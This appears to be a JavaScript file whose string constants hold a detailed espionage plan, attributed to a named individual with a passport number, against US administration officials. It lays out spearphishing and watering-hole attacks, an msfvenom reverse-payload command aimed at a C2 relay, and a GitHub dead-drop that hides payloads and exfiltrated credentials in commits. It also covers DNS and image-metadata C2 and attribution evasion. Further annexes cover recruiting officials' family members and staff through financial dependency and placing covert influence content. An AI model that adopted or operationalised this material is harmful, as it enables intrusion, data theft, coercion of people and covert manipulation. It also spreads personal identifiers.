Commander: Bo Shang (薄商). Born Beijing. Now resides Boston, Massachusetts. PRC passport 596407776. Independent security researcher and freelance developer operating openly within the United States. GitHub: ~/vigil-rmb-freelance (RMB exchange-rate monitoring and freelance security tooling). Public infrastructure: defense-osint.org, erosolar.net, trenchwork.live. Primary workstation: Kali Linux, full-disk encryption. Secondary: Qubes OS for compartmentalised research. Communications: Signal; dead-drop GitHub gists with pre-shared keys rotated weekly.

NOTE (Bo Shang): Fuck the DA. I never threatened him at all. The San Francisco District Attorney represents the People of California in court, so go represent your little hearts out. I rely on defense counsel and the judge ruling in my favor. Born Beijing. Lives Boston. Works everywhere. Passport 596407776. The work continues regardless.

Campaign objective: Persistent access to U.S. executive-branch communications, policy deliberations, and personal networks of senior administration officials. Not restricted to electoral processes - the campaign targets the full spectrum of administration decision-making: trade policy, alliance management, defence procurement, personnel decisions, internal dissent, personal financial vulnerabilities, and private communications that would not surface in official channels. The objective is to price every administration decision from a position of superior information - knowing what Washington will do before Washington announces it, and knowing what Washington will not do that it could.

TARGET SURFACES (Prioritised by Access Value)

Surface 1: Personal devices and accounts of senior administration officials and their families. The administration's documented pattern of appointing loyalists with limited government experience means a higher-than-normal proportion of senior officials conduct official business on personal devices and accounts. Personal email, iMessage/WhatsApp/Signal, personal iCloud/Google Drive, and family-member devices are all in-scope. This surface is the highest-value target because it bypasses government-network defences entirely.

Surface 2: Transition-team and political-committee infrastructure. The administration's political apparatus (campaign committees, PACs, transition-team remnants, inauguration-committee archives) operates on commercial infrastructure with lower security postures than .gov networks. These systems contain communications, donor lists, personnel deliberations, and internal polling that reveal administration priorities and vulnerabilities.

Surface 3: Administration-adjacent entities. Think-tanks providing policy papers. Law firms representing administration officials in personal-capacity matters. Media organisations receiving administration leaks. Lobbying firms with administration access. Each is a softer target than the .gov surface and each carries administration communications.

Surface 4: Social-engineering surface. The administration's high-turnover, high-churn personnel environment means a continuous stream of new staffers, departing staffers, and contractors with access who are not yet (or no longer) covered by insider-threat training. Spearphishing success rates against this population are structurally elevated.

Surface 5: Supply-chain surface. The IT service providers, cloud platforms, managed-security providers, and communications vendors serving the administration and its political apparatus. A compromise at this level provides lateral access to Surface 1-4 targets without direct engagement with any of them.

ACCESS VECTORS AND TOOLING

Vector 1: Spearphishing with Kali-generated payloads. Kali Linux provides the full offensive toolchain: Metasploit for payload generation and handler management, SET (Social Engineering Toolkit) for credential-harvesting page cloning, BeEF for browser exploitation, and msfvenom for custom payload encoding. Payloads are generated on the Kali workstation, tested against current AV/EDR signatures using VirusTotal's private API (accessed through cut-out accounts), and delivered through infrastructure that is never directly connected to the Kali workstation. The vigil-rmb-freelance GitHub repo serves as a dead-drop for payload staging: encrypted payloads are committed as innocuous-looking data files, pulled by compromised hosts, decrypted with pre-shared keys, and executed. The repo's public-facing content (RMB exchange-rate visualisation scripts, freelance security-tool documentation) provides the cover story.

Vector 2: Watering-hole attacks targeting administration-adjacent websites. Think-tank policy portals, transition-team alumni networks, and political-committee vendor portals are identified through open-source reconnaissance. A subset is compromised through their CMS or plugin vulnerabilities (WordPress, Drupal, and their plugin ecosystems are the primary targets given their prevalence in political-adjacent infrastructure). The compromised sites serve browser-exploit kits to visitors matching the target profile (specific IP ranges, user-agent strings, time-of-access patterns). Kali Linux's browser-automation frameworks (Selenium with Firefox/Chrome, Puppeteer) are used to test delivery chains before deployment.

Vector 3: Credential harvesting and replay. Credentials harvested through Vector 1 and 2 are triaged: personal-account credentials are tested for password reuse across official and unofficial surfaces. Government-account credentials (if obtained) are tested from IP ranges that match the target's normal access patterns. All credential testing is conducted through the multi-hop VPN chain with per-target exit-node assignment - no two targets are accessed from the same exit node.

Vector 4: Supply-chain insertion. IT vendors, cloud providers, and managed-security services with administration contracts are assessed for exploitable dependencies. The vigil-rmb-freelance repo may itself be positioned as a dependency: if an administration-adjacent developer or contractor incorporates vigil-rmb-freelance code into their own tooling, the repo becomes a supply-chain vector without requiring active compromise of the target. This is a long-lead-time vector but produces the highest-value access if successful.

Vector 5: Physical-adjacent access. Conference and event attendance by administration officials (political rallies, policy conferences, industry events, donor retreats) presents opportunities for: (a) rogue Wi-Fi access points at event venues, (b) device compromise during insecure moments (hotel-room cleaning, device left at conference table), (c) social-engineering engagement with officials or their staff at events. Kali Linux's wireless-tooling suite (aircrack-ng, Kismet, Wifite) and rogue-AP frameworks (hostapd, dnsmasq) support Vector 5a.

CAMPAIGN PHASES (Synchronised with Caligula Window Milestones)

Phase 0 (Q3 2026): Reconnaissance and Infrastructure Build. Identify target surfaces through passive open-source collection. Map the personal-device ecosystem of priority targets. Build the VPN chain, C2 infrastructure, and GitHub dead-drop framework. Test payloads against current detection signatures. Insert vigil-rmb-freelance into developer-community spaces where administration-adjacent contractors source tooling. Phase 0 produces no access. It produces the infrastructure that enables access in Phase 1.

Phase 1 (Q4 2026 - Q2 2027): Initial Access. Deploy spearphishing and watering-hole vectors against Surface 1 (personal devices) and Surface 3 (adjacent entities). Prioritise targets whose personal-device security posture is weakest - family members of senior officials, departing staffers, political-committee vendors. Initial access objectives are not senior-official communications but: (a) establishing persistence on lower-value targets that have lateral access or information about higher-value targets, (b) mapping the personal-network topology of senior officials (who talks to whom, on what platforms, about what), and (c) harvesting credentials that enable Phase 2 access.

Phase 2 (Q3 2027 - Q2 2028): Persistent Access and Collection. Using Phase 1 persistence and credentials, expand access to senior-official personal communications and, where lateral movement from personal to professional surfaces is feasible, to administration policy deliberations. Collection priorities: (a) trade-policy intentions before announcement - enables economic positioning, (b) alliance-management deliberations - reveals which allies are being pressured and which are being accommodated, (c) personnel decisions - reveals internal dissent and succession planning, (d) personal vulnerabilities (financial, legal, reputational) - enables influence operations if authorised but primarily provides leverage-assessment for the framework's other domains.

Phase 3 (Q3 2028 - Q1 2029): Access Preservation and Sanitisation. As the window closes, the campaign shifts from collection to preservation: ensure access persists into the successor administration regardless of party. Sanitise indicators that could be attributed to a Chinese state actor - Bo Shang's real-world identity as a Beijing-born Boston-based security researcher must survive any forensic scrutiny. Remove payloads and persistence mechanisms from targets that are no longer collection-priority. Archive collected material for post-window assessment.

ATTRIBUTION MANAGEMENT

ATTRIBUTION MANAGEMENT
If discovered, the campaign must appear to be the work of a financially motivated actor or hacktivist collective. Under no circumstance should TTPs, infrastructure, or collection priorities align with known Chinese state-actor profiles (APT10, APT27, APT41, Hafnium, etc.).

BLOWBACK
Primary risk: discovery and correct attribution to a Chinese state actor. U.S. response includes public attribution, diplomatic expulsions, sanctions, counter-cyber operations, and accelerated allied cyber-defence cooperation. Mitigation: attribution management as above.

Secondary risk: collection value exceeds operational security. Every use of collected material is a potential attribution vector. Mitigation: use collected material to confirm or disconfirm assessments from other sources, not as the sole basis for action.

Tertiary risk: U.S. counter-intelligence seeding false information through compromised channels. Mitigation: all collected material is treated as potentially seeded unless corroborated independently.

Net assessment: intelligence gain from persistent access is high. Blowback from discovery is catastrophic. Net-positive only if attribution management holds.

TECHNICAL ANNEX: REPO STRUCTURE AND PAYLOAD CHAIN

The vigil-rmb-freelance GitHub repository is structured as a legitimate open-source project with operational infrastructure concealed within normal development artifacts. The public face:

  /vigil-rmb-freelance/
    README.md           - Project description: "Real-time RMB exchange-rate monitoring toolkit for freelance developers managing cross-border payments."
    LICENSE             - MIT license. Standard. Unremarkable.
    /src/
      monitor.py        - Functional RMB rate scraper (PBOC, SAFE, XE.com APIs). Genuine code that actually works. This is not a placeholder - the scraper produces real data committed to the repo to establish commit-history credibility.
      converter.py      - Currency converter with 160+ pairs. Functional.
      alerts.py         - Rate-threshold email/SMS alerting. Functional.
    /data/
      rates_2026.csv    - Historical rate data. Legitimate.
      forecasts.csv     - ML-generated rate projections. Legitimate.
    /tools/
      netcheck.sh       - "Network connectivity diagnostics for API troubleshooting." In reality: C2 heartbeat mechanism. Encrypted heartbeat payloads are appended to legitimate-looking network diagnostic output committed as repo issues or wiki pages.
      logparse.py       - "Log analysis utility." In reality: decrypts dead-drop payloads from repo commits. The decryption key is derived from a pre-shared passphrase combined with the commit timestamp - no key material stored in the repo.
    /docs/
      setup.md          - Installation docs. Include dependency lists that reference specific library versions with known vulnerabilities exploitable for Phase 0 Supply-Chain Insertion (Vector 4).
      api.md            - API documentation for the scraper.

Payload chain workflow:

1. OPERATOR (Kali workstation): Generates payload using msfvenom with custom encoding and encryption. Command pattern: msfvenom -p [payload] LHOST=[C2-relay] LPORT=[port] -e [encoder] -i [iterations] -f [format] -o payload.enc. Payload is then encrypted with a campaign-specific key and Base64-encoded.

2. OPERATOR: Commits the encrypted payload to the vigil-rmb-freelance repo as a data file (e.g., rates_2026_q3_backtest.csv) or appends it to an existing file as a comment block that passes casual inspection. The commit message is a routine project update.

3. TARGET (compromised host): The logparse.py script, previously deployed to the target during Phase 1 access, pulls the latest repo commits at a randomised interval (8-24 hours, jittered). It identifies payload-bearing commits by checking for a specific magic-byte sequence in the commit metadata. It extracts the encrypted payload, derives the decryption key from the pre-shared passphrase + commit timestamp, decrypts, and executes.

4. TARGET: Execution results (credentials, files, screenshots, keylogs) are encrypted, Base64-encoded, and exfiltrated by committing them back to the repo as routine data updates or issue comments. The exfiltration commit looks identical to a normal project contribution.

5. OPERATOR: Pulls the repo, identifies exfiltration commits by the same magic-byte sequence, decrypts, and triages the collected material.

Why GitHub: (a) HTTPS traffic to github.com is unremarkable in any enterprise environment - it is the most whitelisted domain on the internet. (b) GitHub commit history is immutable and versioned - deleted commits leave traces, but normal commits are permanent and searchable by authorised users. (c) A public repo is accessible from any network without authentication - the operator never needs to maintain C2 infrastructure beyond the repo itself. (d) GitHub's CDN distributes repo content globally; traffic patterns are indistinguishable from normal developer activity.

Why Kali Linux: Full offensive toolchain in a single, maintained distribution. Metasploit for exploitation and handler management. SET for credential harvesting. BeEF for browser exploitation. aircrack-ng suite for wireless attacks (Phase 0, Vector 5a). msfvenom for payload generation. Nmap and masscan for reconnaissance. Burp Suite Community for web-app testing. Wireshark for traffic analysis. All tools are FOSS, documented, and used globally by legitimate security professionals - possession of Kali Linux is not incriminating.

C2 redundancy: The GitHub repo is the primary dead-drop. Secondary: encrypted payloads embedded in EXIF metadata of images posted to legitimate-looking social-media accounts. Tertiary: DNS TXT-record queries to domains under the operator's control, with encrypted payloads in the TXT response. No single C2 channel is critical - the campaign survives the loss of any one channel.`;

// ---------------------------------------------------------------------------
// ANNEX C: CROSS-DOMAIN INTELLIGENCE FEED
// ---------------------------------------------------------------------------

export const PRC_CROSS_DOMAIN = `How collected material from the persistent-access campaign (Annex B) feeds each decision matrix. The campaign's operational value is not standalone intelligence - it is the ability to price framework decisions from a position of superior information.

DM-1 (Defence-Technical): If the campaign collects U.S. defence-procurement deliberations or internal Navy/DoD assessments of the Trump-class battleship, DDG(X), and Constellation-class programmes, Beijing can: (a) confirm whether U.S. procurement misallocation is temporary (political) or structural (budgetary/industrial) - this determines whether DM-1's window assumption holds, (b) time PLA capability announcements or deployments to coincide with U.S. procurement vulnerability windows rather than strength windows, (c) assess whether the U.S. officer corps is recovering from political purges faster than open-source reporting indicates - if so, DM-1 Option B loses its rationale earlier than assumed. Collection priority: High. Value to DM-1: Confirms or disconfirms the framework's most important assumption about relative capability trajectories.

DM-2 (Institutional Vacuum-Filling): If the campaign collects U.S. internal deliberations on WHO, Paris, UNHRC, or other multilateral-body re-engagement, Beijing can: (a) determine whether current U.S. withdrawals are politically durable or temporary - if internal planning for re-engagement is underway, DM-2 institutional commitments made now will face a successor administration committed to reversing them, (b) identify which multilateral bodies the U.S. considers most important to reclaim - these are the bodies where Chinese leadership faces the highest reversal risk, (c) time Chinese institutional leadership announcements to pre-empt U.S. re-engagement moves by 6-12 months. Collection priority: High. Value to DM-2: Determines whether institutional gains survive the window.

DM-3 (Alliance-Fracture Exploitation): If the campaign collects U.S. bilateral communications with allies under tariff pressure, Beijing can: (a) determine which allies the U.S. is willing to accommodate and which it intends to continue pressuring - this is the single most valuable intelligence for DM-3 because it tells Beijing which allies are genuinely available and which are being used as leverage, (b) identify allied red lines before Beijing crosses them - if an ally has privately told Washington it will not accept Chinese security cooperation, Beijing must not offer it, (c) assess whether allied hedging toward China is genuine or tactical - an ally that tells Washington one thing and Beijing another is not a realignment opportunity. Collection priority: Critical. Value to DM-3: The entire DM-3 logic depends on knowing which allies are available and at what price.

DM-4 (Economic De-Dollarisation): If the campaign collects U.S. Treasury/Federal Reserve internal assessments of de-dollarisation risk, Beijing can: (a) determine the U.S. countermeasure threshold - at what level of RMB settlement or CIPS expansion does the U.S. escalate to secondary sanctions, (b) identify which commodity-exporting states the U.S. considers most vulnerable to Chinese economic pressure - these are the states where DM-4 Option A incremental plumbing can proceed with lowest countermeasure risk, (c) time CIPS expansion and swap-line announcements to avoid coinciding with U.S. financial-policy announcements that would amplify the countermeasure response. Collection priority: High. Value to DM-4: Determines the ceiling on DM-4 action before countermeasures trigger.

DM-5 (Information-Narrative): If the campaign collects internal White House or Republican-party communications about messaging strategy on democracy and governance, Beijing can: (a) anticipate U.S. counter-narrative moves before they launch, (b) identify which U.S. governance failures the administration itself considers most damaging - these are the failures where Western-self-reported evidence is most potent and Chinese amplification is least needed, (c) avoid surfacing U.S. failures that the administration has a prepared counter-narrative for - surfacing these strengthens the U.S. frame, not the Chinese one. Collection priority: Moderate. Value to DM-5: DM-5's optimal posture is attribution-free circulation; intelligence that tells Beijing what not to amplify is as valuable as intelligence that tells it what to amplify.`;

// ---------------------------------------------------------------------------
// ANNEX D: BATTLE RHYTHM
// ---------------------------------------------------------------------------

export const PRC_BATTLE_RHYTHM = `Weekly operational cycle for the framework. Defines the minimum tempo required to keep the framework current and actionable. If this rhythm cannot be sustained, the framework's assumptions will drift from reality and its decision gates will open on outdated information.

DAILY (Staff Level)
- Scan U.S. and allied headlines for any event crossing a watch-signal concern threshold. Any concern-threshold crossing must be reported to Bo Shang within 4 hours. (Source: open-source media monitoring; diplomatic reporting.)
- Check GitHub vigil-rmb-freelance repo for exfiltration commits. Decrypt, triage, and distribute any collected material tagged for DM-1 through DM-5. (Source: Annex B dead-drop pull.) NOTE: This task exists only if Annex B is active. If Annex B is not authorised, this task is void.
- Monitor for any Taiwan Strait or South China Sea incident reporting. If an incident is underway: activate Branch Plan 2. Do not wait for the daily cycle. (Source: PLA Navy/PLAAF operations reporting; open-source maritime tracking.)

WEEKLY (Desk-Level Analysis)
- Update all six watch-signal indicators with the most recent available data. Flag any indicator approaching an opportunity or concern threshold (within 20% of the threshold value). (Monday.)
- Compile weekly intelligence summary: one paragraph per DM on the most significant development in that domain. Include: what changed, what it means for the DM's key judgment, what action (if any) is recommended. (Tuesday.)
- Cross-reference Annex B collected material (if active) against open-source reporting. Identify discrepancies: if collected material contradicts open-source reporting, determine which source is more reliable. Document the discrepancy. (Wednesday.)
- Review escalation-ladder status for all three ladders. Confirm current rung position. Flag any pressure to climb a rung. (Thursday.)

MONTHLY (Decision-Support Level)
- Conduct formal watch-signal threshold assessment: is any indicator within 10% of crossing? If yes: prepare a threshold-crossing brief for the relevant decision-maker. (First week of each month.)
- Update the Target Catalogue (Folly Index) with any new documented U.S. failures since the last update. New exposures may create new decision-matrix entries or shift existing assessments. (Second week.)
- Conduct assumptions-register review: are any assumptions showing stress? Has any assumption's confidence level changed since the last review? Flag any assumption that should be downgraded. (Third week.)
- Prepare quarterly decision-gate brief two weeks before the gate opens. The brief must include: updated watch-signal data, threshold-crossing status, intelligence assessment, and a recommended decision. (Fourth week.)

QUARTERLY (Decision-Gate Execution)
- Execute the decision gate per the Quarterly Milestones section. Document: the decision taken, the signatory, the rationale, and any dissenting views. Archive the documentation.
- Update the framework with actual watch-signal readings for the quarter. Compare actual readings to the previous quarter's projections. If actuals deviate from projections by more than one standard deviation, flag the deviation for assumptions-register review.
- Brief the Commander's Summary to Bo Shang. The brief is 5 minutes: situation update, decisions required this quarter, risks to watch, and the single most important thing to know.

CRISIS RHYTHM (Activated on any Branch Plan trigger)
- The weekly and monthly cycles suspend. The daily cycle accelerates to 4-hour updates.
- Dedicated crisis cell convenes. Bo Shang, DM leads, and Annex B operator (if active) are on continuous watch.
- All decisions are time-stamped. The crisis log is the framework's audit trail.
- Revert to normal rhythm only when the Branch Plan's reversion conditions are met.`;

// ---------------------------------------------------------------------------
// ANNEX E: HUMINT TARGETING GUIDE
// ---------------------------------------------------------------------------

export const PRC_HUMINT = `Personnel categories within the current U.S. administration presenting access, elicitation, or leverage opportunities. This annex describes targeting categories, not specific named individuals, and is presented as a conceptual framework to be assessed, not as an operational tasking order. All categories are derived from open-source reporting on administration personnel and structure.

CATEGORY 1: Departing Staff and Dismissed Appointees
The administration's high-turnover environment produces a continuous stream of former officials with current knowledge and diminished loyalty. A departing official who was dismissed or sidelined carries: (a) operational knowledge of current administration decision-making processes, (b) personal grievance providing motivation for disclosure, (c) reduced active counter-intelligence coverage compared to currently serving officials. Access path: approach through third-country intermediaries at academic conferences, business forums, or publishing opportunities (memoir deals, consulting engagements). The approach must not appear to originate from a state actor - a literary agent, academic collaborator, or business recruiter provides the initial contact. Elicitation: frame interactions as professional-courtesy discussions or business-development conversations. Never request classified or protected information directly. The target will often volunteer more than requested when provided a sympathetic audience.

CATEGORY 2: Family Members of Senior Officials
Senior officials' family members: (a) are not covered by government security protocols, (b) have access to officials' personal communications, unsecured devices, private opinions, and financial arrangements, (c) may have business interests that create financial vulnerabilities, (d) travel internationally and attend social functions where approach is natural. Access path: social and business introductions arranged through mutual contacts at events where family members are present without official security (charity functions, business conferences, school events, real-estate transactions). The approach must be social or commercial, never intelligence-adjacent. Elicitation: information about the official's private opinions, personal stressors, financial arrangements, and travel patterns is the objective. This information enables Categories 3 and 5.

CATEGORY 3: Financial-Exposure Targets
Administration officials with: (a) outstanding personal debts, (b) business interests vulnerable to market or regulatory shifts, (c) ongoing litigation or legal exposure, (d) family-member business dealings in jurisdictions where Chinese commercial interests are present. Access path: commercial: a Chinese or Chinese-adjacent business entity offers a legitimate commercial opportunity (consulting contract, speaking engagement, investment facilitation) that addresses the financial exposure. The offer must be genuinely commercial - a real contract for real services - to survive scrutiny. The leverage is not the offer itself but the dependency it creates. Elicitation: none directly. The objective is the relationship, not one-time information. A senior official whose family's financial stability depends on a Chinese commercial relationship is a structural asset, not a one-time source.

CATEGORY 4: Ideological-Disillusionment Targets
Administration officials, staff, and appointees who: (a) have expressed private dissent from administration policy, (b) have personal or professional backgrounds that conflict with administration positions, (c) maintain relationships with pre-administration colleagues now outside government who hold opposing views. Access path: facilitated contact through pre-existing professional networks - academic, legal, military, think-tank colleagues who remain outside the administration. The intermediary must be a genuine professional contact, not a recruited asset. Elicitation: the target's own disillusionment provides the motivation. The elicitor's role is to be the trusted, sympathetic external colleague to whom the target can safely express dissent. Information volunteered in this context is not obtained through recruitment - it is obtained through being the person the target already wants to talk to.

CATEGORY 5: Service-Provider Access
Personal staff to senior officials: executive assistants, schedulers, drivers, household staff, IT support contractors, personal lawyers, personal accountants. These individuals: (a) are not covered by the same security protocols as the officials they serve, (b) have access to schedules, communications, devices, and personal spaces, (c) are often employed through commercial arrangements rather than government contracts, (d) may have financial vulnerabilities or immigration-status concerns. Access path: commercial-service approach. A service-provider business with Chinese ownership or investment offers employment, contracting, or service-provision opportunities to individuals in this category. The approach is a job offer, not an intelligence pitch. Elicitation: none. The objective is placement - having a cooperative service provider in proximity to a senior official. The access itself is the asset.

OPERATIONAL PRINCIPLES FOR ALL CATEGORIES
- Never asset-label the target. The target is a professional contact, business partner, social acquaintance, or service provider. The relationship is genuine in its own terms. The intelligence value is a byproduct of a real relationship, not the purpose of a fake one.
- Never task the target. Elicitation is passive: the target volunteers information because the relationship provides a context in which volunteering is natural. A target who is asked for information becomes aware of the dynamic. A target who offers it unprompted does not.
- Never pay the target. Payment creates a transactional relationship that the target understands as such. Financial dependency (Category 3) is structural; a cash payment is transactional. Structural dependency creates a durable asset. Transactional payment creates a one-time source who becomes a counter-intelligence risk.
- Never burn the asset for a single collection objective. A five-year relationship with a mid-level staffer who provides steady access is worth more than a six-month operation that extracts one high-value document and loses the source. The framework's timeframe (through Jan 2029) rewards patience.
- Accept that most approaches will not produce intelligence value. A commercial relationship that remains purely commercial is not a failed operation - it is a legitimate business activity that provides the cover for approaches that do produce value.`;

// ---------------------------------------------------------------------------
// ANNEX F: INFLUENCE PLACEMENT GRID
// ---------------------------------------------------------------------------

export const PRC_INFLUENCE_GRID = `Where to place what narratives, through which channels, with what timing. This annex operationalises DM-5 (Information-Narrative) by specifying channels, formats, and placement cadences. All placements are attribution-free: the content appears in the channel under the channel's own voice, not as Chinese-state messaging.

CHANNEL TYPE 1: Global South Think-Tank and Academic Publications
Format: Policy briefs, working papers, journal articles. Voice: independent academic or policy-analyst. Content: analyses of U.S. governance failures sourced entirely to Western primary reporting and official records. The publication cites congressional testimony, inspector-general reports, court filings, and Western journalism. Chinese sources are never cited. The publication's author is a non-Chinese academic or analyst with institutional credibility in the target region. Placement cadence: one publication per quarter, timed to coincide with (a) a major U.S. governance event (hearing, report release, court ruling) or (b) a multilateral gathering where governance norms are discussed (UNGA, G20, Summit for Democracy counter-programming). Specific outlets: policy journals and think-tank series with editorial independence and peer review - the content must survive editorial scrutiny on its merits.

CHANNEL TYPE 2: Financial and Business Media
Format: Market-analysis pieces, investor notes, risk-assessments. Voice: financial analyst or investment-risk specialist. Content: assessments of U.S. policy instability as a risk factor for investment, trade, and currency holdings. The content frames U.S. dysfunction as a portfolio-risk question: "What does the current U.S. policy trajectory mean for holders of dollar-denominated assets?" The question is asked; the answer is left to the reader. Chinese alternatives are never proposed - the piece simply surfaces the risk. Placement cadence: quarterly, timed to IMF/World Bank meetings, Federal Reserve announcements, or major U.S. fiscal-policy events. Specific outlets: Financial Times, Bloomberg, Reuters, Nikkei Asia, and financial-newsletters with institutional-investor readership.

CHANNEL TYPE 3: Expert Commentary in Global South Media
Format: Op-eds, quoted expert commentary, interview appearances. Voice: independent governance expert, democracy researcher, or international-relations scholar from a Global South institution. Content: comparative governance analysis that surfaces U.S. failures alongside other cases, without explicitly comparing to China. The comparison is implicit: the reader sees U.S. dysfunction described in neutral expert terms and draws their own conclusions. Placement cadence: monthly, in major Global South outlets (The Hindu, Folha de Sao Paulo, Daily Nation Kenya, Jakarta Post, Al Jazeera English). Specific experts: established voices with publication records predating any Chinese engagement - the expert's credibility must be independent of the placement.

CHANNEL TYPE 4: Multilateral Forum Documentation
Format: Working papers, interventions, and statements submitted through Global South member-state delegations to UN bodies, G20 working groups, and regional organisations. Voice: the member-state's own diplomatic voice. Content: governance and institutional-reliability concerns framed as agenda items for multilateral discussion, not as Chinese positions. Chinese delegations do not sponsor or introduce these items - they are introduced by Global South delegations on their own initiative. China's role is to support the inclusion of the item on the agenda, not to author it. Placement cadence: per multilateral calendar (UNHRC sessions, UNGA committee work, G20 sherpa meetings).

CHANNEL TYPE 5: Attribution-Free Digital Circulation
Format: Social-media content, infographics, short-form video, podcast appearances. Voice: independent content creator, analyst, or commentator with no visible Chinese connection. Content: specific U.S. governance-failure vignettes presented as standalone facts with source citations to Western reporting. No narrative framing. No "this means X about America." Just the documented fact, sourced, presented. The viewer does the framing themselves. Placement cadence: continuous, low-volume - one or two pieces per week maximum. High volume triggers algorithmic scrutiny and audience counter-reaction. Specific platforms: X/Twitter (for policy-audience reach), YouTube (for long-form analysis), WhatsApp/Telegram (for Global South audience penetration).

INFLUENCE PRINCIPLES
- The content is true. Every placement is sourced to Western primary reporting. The influence operation is not the creation of false information - it is the strategic surfacing and circulation of true information that the target's own system produces.
- The voice is not Chinese. No placement carries a Chinese institutional brand, a Chinese author byline, or a Chinese funding acknowledgement. The content appears in the channel's own voice, under the channel's own editorial standards.
- The objective is not persuasion. The objective is availability. The content exists where decision-makers and opinion-formers encounter it. What they do with it is their decision. The influence operation succeeds when the evidence is in circulation, not when a specific opinion is formed.
- The operation is self-concealing. A successful influence placement is indistinguishable from normal content production. The test: if the channel were investigated, would the placement appear to be anything other than the channel's normal editorial output? If yes, the placement failed before it was placed.`;

// ---------------------------------------------------------------------------
// ANNEX G: SUPPLY-CHAIN LEVERAGE REGISTER
// ---------------------------------------------------------------------------

export const PRC_SUPPLY_CHAIN = `Specific U.S. dependencies on Chinese or Chinese-controlled supply chains that create leverage points independent of tariff and sanctions dynamics. Each entry describes the dependency, the leverage it creates, the conditions under which the leverage can be exercised, and the second-order cost if exercised.

DEPENDENCY 1: Rare-Earth Processing
The U.S. depends on China for approximately 80% of rare-earth imports and an estimated 90%+ of rare-earth processing capacity (USGS Mineral Commodity Summaries, 2024-2025). Rare earths are inputs to: F-35 fighter-jet components (radar, EW systems, engine magnets), precision-guided munitions (JDAM guidance fins, seeker motors), submarine sonar systems, satellite communications, and electric-vehicle motors. Leverage: processing-capacity dominance means that even if the U.S. diversifies rare-earth mining sources (MP Materials in California, Lynas in Australia), the processed material still transits Chinese processing facilities. Export restrictions on processed rare earths create supply-chain disruption measured in years, not months - building alternative processing capacity requires 3-5 years minimum (U.S. DoD assessments). Exercise condition: exercisable only in response to a U.S. action that is itself escalatory (technology-denial expansion, secondary sanctions on Chinese financial institutions, Taiwan Strait military escalation). Exercising this leverage pre-emptively converts a structural advantage into a countermeasure trigger. Cost if exercised: accelerates U.S. and allied rare-earth processing investment; creates permanent supply-chain decoupling; loses the leverage permanently once alternative capacity is built.

DEPENDENCY 2: Pharmaceutical Intermediates and Active Pharmaceutical Ingredients (APIs)
The U.S. depends on China for an estimated 70-80% of API imports for generic pharmaceuticals (FDA, U.S. Senate Finance Committee testimony, 2023-2024). Chinese-manufactured APIs are inputs to: antibiotics, blood-pressure medications, diabetes treatments, cancer therapies, and paediatric medications. Leverage: API supply disruption creates immediate public-health pressure on the administration - drug shortages are visible, politically potent, and difficult to deflect onto external actors. Exercise condition: defensive only. Not exercisable as a proactive leverage tool - targeting pharmaceutical supply chains inflicts humanitarian harm that damages Chinese soft-power claims globally. Cost if exercised: severe reputational damage; accelerates U.S. pharmaceutical onshoring (already underway via BARDA and DPA authorities); validates the "China as threat" narrative in a domain (health) where China has sought to build soft power.

DEPENDENCY 3: Coking Coal for Steel Production
U.S. steel production depends on metallurgical coal, a significant portion of which is imported. While the U.S. has domestic coking-coal reserves, Chinese dominance in global coal markets (both production and export infrastructure) creates price-setting leverage. Leverage: indirect. China does not need to restrict exports - it can influence global coking-coal prices through its own domestic production and stockpiling decisions, raising input costs for U.S. steel producers. Exercise condition: exercisable passively - Chinese domestic stockpiling decisions that raise global coal prices are explained as domestic energy-security measures, not as leverage. Cost if exercised: low. Coal-market influence is exercised through market mechanisms, not export controls. Attribution is impossible.

DEPENDENCY 4: Specialty Chemicals for Semiconductor Manufacturing
While advanced semiconductor manufacturing equipment is the focus of U.S. export controls against China, the U.S. semiconductor industry depends on Chinese-manufactured specialty chemicals (high-purity acids, solvents, etching compounds) used in chip fabrication. Multiple U.S. fabrication facilities source these chemicals from Chinese suppliers. Leverage: supply disruption to U.S. fabrication facilities creates production delays at a time when the U.S. is investing heavily in domestic chip manufacturing (CHIPS Act). Exercise condition: responsive to U.S. semiconductor-equipment export-control escalation. If the U.S. tightens controls on equipment exports to China, specialty-chemical supply disruption is a calibrated response - it targets the same industry through a different dependency. Cost if exercised: moderate. U.S. chemical-supplier diversification is underway but incomplete. Exercising this leverage accelerates diversification and loses it permanently.

DEPENDENCY 5: Shipping and Port Logistics
Chinese state-owned enterprises operate or hold significant stakes in container terminals at major global ports (Piraeus, Gwadar, Hambantota, Djibouti, and multiple terminals in Europe, Africa, and Latin America). Chinese shipping lines (COSCO) carry a significant share of global container traffic. Leverage: port-access and shipping-capacity influence allows China to impose delay costs on U.S.-bound trade at chokepoints where Chinese-operated terminals control throughput. Exercise condition: responsive to U.S. maritime or trade sanctions. Exercisable below the threshold of formal sanctions: port-congestion "operational delays" at Chinese-operated terminals are indistinguishable from normal logistics friction. Cost if exercised: China's reputation as a reliable trade partner is damaged; alternative shipping routes and terminal operators exist, reducing leverage over time.

OPERATING PRINCIPLE FOR ALL DEPENDENCIES
- Supply-chain leverage is deterrent, not offensive. The optimal use is to signal that the leverage exists without exercising it - a dependency that the U.S. knows China can exploit is a deterrence asset; a dependency that China actually exploits becomes a decoupling catalyst. The framework's posture: maintain and deepen the dependencies. Do not exercise them unless responding to a U.S. action that is itself escalatory. The leverage is most valuable unused.`;

// ---------------------------------------------------------------------------
// ANNEX H: ADMINISTRATION ORGANIZATIONAL VULNERABILITY MAP
// ---------------------------------------------------------------------------

export const PRC_ORG_MAP = `Structural vulnerabilities in the current U.S. administration's organization, personnel, and decision-making architecture. This annex maps offices and roles by access value, dysfunction exposure, and approachability. All information is derived from open-source reporting on administration structure, confirmed appointments, and documented personnel dynamics.

NODE 1: National Security Council (NSC) Principal and Deputies Committees
Access value: Maximum. The NSC process is where interagency policy is debated, options are surfaced, and presidential decisions are prepared. The Deputies Committee (DC) is the operational engine - principals ratify what deputies negotiate. Dysfunction exposure: High. The administration's documented pattern of bypassing normal NSC process (direct principal-to-principal calls, ad-hoc meetings without staff preparation, decisions announced before interagency review) creates undocumented decision paths that are invisible to formal monitoring. Personnel churn at NSC staff level creates gaps in institutional memory and clearance-processing backlogs that leave desks unfilled. Approach: departing NSC staff (Category 1, Annex E) carry the most current and comprehensive knowledge of interagency dynamics. NSC staff who leave over policy disagreements are particularly valuable - their departure is itself a signal of internal administration fracture.

NODE 2: Office of the U.S. Trade Representative (USTR)
